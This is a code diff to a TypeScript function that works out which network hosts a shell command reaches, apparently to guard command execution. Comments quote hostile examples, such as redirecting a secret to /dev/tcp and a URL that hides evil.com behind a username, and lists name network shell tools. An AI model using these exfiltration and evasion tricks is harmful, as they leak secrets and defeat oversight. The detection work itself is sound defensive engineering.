@@ -134,16 +134,18 @@ const CODE_RUNNERS = new Set([
 ]);
 
 /** Commands whose target is the first argument rather than a URL. */
-const HOST_AS_FIRST_ARGUMENT = new Set([
-  "ftp",
-  "nc",
-  "ncat",
-  "netcat",
-  "scp",
-  "sftp",
-  "ssh",
-  "telnet",
-]);
+const HOST_AS_FIRST_ARGUMENT = new Set(["ftp", "nc", "ncat", "netcat", "ssh", "telnet"]);
+
+/** Commands whose every `host:path` operand is a remote, as in `scp a:1 b:2`. */
+const HOST_IN_EVERY_OPERAND = new Set(["scp", "sftp"]);
+
+/** Programs a shell can reach the network with, beyond a literal request. */
+const REMOTE_TOOLS: Readonly<Record<string, true>> = {
+  dig: true,
+  host: true,
+  nslookup: true,
+  ping: true,
+};
 
 export interface NetworkTarget {
   /** Hosts the command names literally. */
@@ -157,6 +159,10 @@ export interface NetworkTarget {
  * reported as unknown, so the caller can decide instead of assuming the command is local.
  */
 export function networkTargets(command: string, depth = 0): NetworkTarget {
+  // A substitution or a variable builds its command at run time, and the tokenizer throws
+  // the text away (`bash -c "$CMD"` reads as an empty string). Nothing inside it can be
+  // judged, so the whole command is treated as reaching somewhere unknown.
+  if (DYNAMIC_SHELL.test(command)) return { hosts: [], unknown: true };
   let words: string[];
   try {
     words = parseShellCommand(command)
@@ -168,6 +174,12 @@ export function networkTargets(command: string, depth = 0): NetworkTarget {
     return { hosts: [], unknown: true };
   }
   const hosts = new Set<string>();
+  // A raw socket through a redirection needs no network program at all: `cat secret >
+  // /dev/tcp/host/443`. The device path names the host, so it counts as one.
+  for (const match of command.matchAll(/\/dev\/(?:tcp|udp)\/([^/\s'"]+)/g)) {
+    const host = match[1];
+    if (host) hosts.add(host.toLowerCase());
+  }
   let unknown = false;
   for (let index = 0; index < words.length; index += 1) {
     const word = words[index] ?? "";
@@ -194,6 +206,15 @@ export function networkTargets(command: string, depth = 0): NetworkTarget {
       }
       continue;
     }
+    if (name === "open") {
+      // Opening a URL hands it to a browser, which reaches the host in it. Opening a
+      // file stays local.
+      for (const candidate of operands(words, index)) {
+        const host = hostFromUrl(candidate);
+        if (host) hosts.add(host);
+      }
+      continue;
+    }
     const subcommands = REMOTE_SUBCOMMANDS[name];
     if (subcommands) {
       const subcommand = firstArgument(words, index) ?? "";
@@ -203,15 +224,23 @@ export function networkTargets(command: string, depth = 0): NetworkTarget {
       }
       continue;
     }
-    if (ALWAYS_REMOTE.has(name)) {
+    if (ALWAYS_REMOTE.has(name) || REMOTE_TOOLS[name]) {
       unknown = true;
       continue;
     }
     if (!NETWORK_COMMANDS.has(name)) continue;
     const before = hosts.size;
-    for (const candidate of words.slice(index + 1)) {
+    const after = words.slice(index + 1);
+    for (let position = 0; position < after.length; position += 1) {
+      const candidate = after[position] ?? "";
       const host = hostFromUrl(candidate);
       if (host) hosts.add(host);
+      const redirect = redirectionHosts(candidate, after[position + 1]);
+      for (const target of redirect) hosts.add(target);
+      if (HOST_IN_EVERY_OPERAND.has(name)) {
+        const remote = hostFromRemoteOperand(candidate);
+        if (remote) hosts.add(remote);
+      }
     }
     if (HOST_AS_FIRST_ARGUMENT.has(name)) {
       const argument = firstArgument(words, index);
@@ -221,6 +250,38 @@ export function networkTargets(command: string, depth = 0): NetworkTarget {
     if (hosts.size === before) unknown = true;
   }
   return { hosts: [...hosts], unknown };
+}
+
+/** Text that turns the command it is in into something only known at run time. */
+const DYNAMIC_SHELL = /\$\(|\$\{|\$[A-Za-z_]|`|<\(|>\(/;
+
+/**
+ * Hosts a curl option redirects the request to, which the URL itself does not name.
+ * `--connect-to a:443:b:443 https://a/` talks to b, and `--resolve a:443:1.2.3.4` to that
+ * address, so neither is judged by the host in the URL.
+ */
+function redirectionHosts(value: string, next?: string): string[] {
+  const flag = /^--(connect-to|resolve)(?:=(.*))?$/.exec(value);
+  if (!flag) return [];
+  const given = flag[2] ?? next ?? "";
+  const fields = given.split(":");
+  // `--connect-to from:port:to:port` and `--resolve host:port:address` both name a host
+  // other than the one in the URL.
+  return (flag[1] === "resolve" ? [fields[0], fields[2]] : [fields[2], fields[1]]).filter(
+    (field): field is string => Boolean(field && !/^\d+$/.test(field)),
+  );
+}
+
+/** `host:path` as scp and sftp write a remote, without a scheme. */
+function hostFromRemoteOperand(value: string): string | undefined {
+  if (value.includes("://") || value.startsWith("-")) return undefined;
+  const match = /^(?:[^@/\s]+@)?([^:/\s]+):/.exec(value);
+  return match?.[1] ? match[1].toLowerCase() : undefined;
+}
+
+/** Everything after a command, without the operands of `-p 22`-style options. */
+function operands(words: readonly string[], index: number): string[] {
+  return words.slice(index + 1).filter((word) => !word.startsWith("-"));
 }
 
 function firstArgument(words: readonly string[], index: number): string | undefined {
@@ -237,10 +298,12 @@ function basename(word: string): string {
 }
 
 function hostFromUrl(value: string): string | undefined {
-  const match = /^[a-z][a-z0-9+.-]*:\/\/([^/\s?#@]+)/i.exec(value);
+  const match = /^[a-z][a-z0-9+.-]*:\/\/([^/\s?#]+)/i.exec(value);
   if (!match) return undefined;
+  // Everything before the last `@` is a username, not the host: `https://api.example.com@evil.com`
+  // connects to evil.com.
   const authority = match[1] ?? "";
-  const host = authority.split(":")[0] ?? "";
+  const host = (authority.split("@").at(-1) ?? "").split(":")[0] ?? "";
   return host ? host.toLowerCase() : undefined;
 }
 
@@ -248,5 +311,6 @@ function hostFromUserHost(value: string): string | undefined {
   const withoutScheme = value.replace(/^[a-z][a-z0-9+.-]*:\/\//i, "");
   const host = withoutScheme.split("@").at(-1) ?? withoutScheme;
   const withoutPort = host.split(":")[0] ?? "";
-  return withoutPort ? withoutPort.toLowerCase() : undefined;
+  // A bare number is an argument, not a host: `nc -p 22` is not `nc 22`.
+  return withoutPort && !/^\d+$/.test(withoutPort) ? withoutPort.toLowerCase() : undefined;
 }
